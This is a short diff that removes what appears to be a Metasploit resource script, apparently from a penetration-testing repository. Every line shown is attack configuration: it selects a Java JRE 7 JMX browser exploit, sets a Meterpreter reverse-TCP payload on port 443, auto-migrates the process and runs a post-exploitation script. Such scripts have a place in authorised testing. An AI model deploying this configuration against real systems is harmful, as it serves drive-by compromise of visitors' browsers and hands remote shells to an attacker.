@@ -1,9 +1,0 @@
-use exploit/multi/browser/java_jre17_jmxbean
-set SRVPORT 443
-set URIPATH /
-set PAYLOAD java/meterpreter/reverse_tcp
-set LHOST 
-set LPORT 443
-set InitialAutoRunScript migrate -f
-exploit
-set AutoRunScript /opt/scripts/resource/post.rc
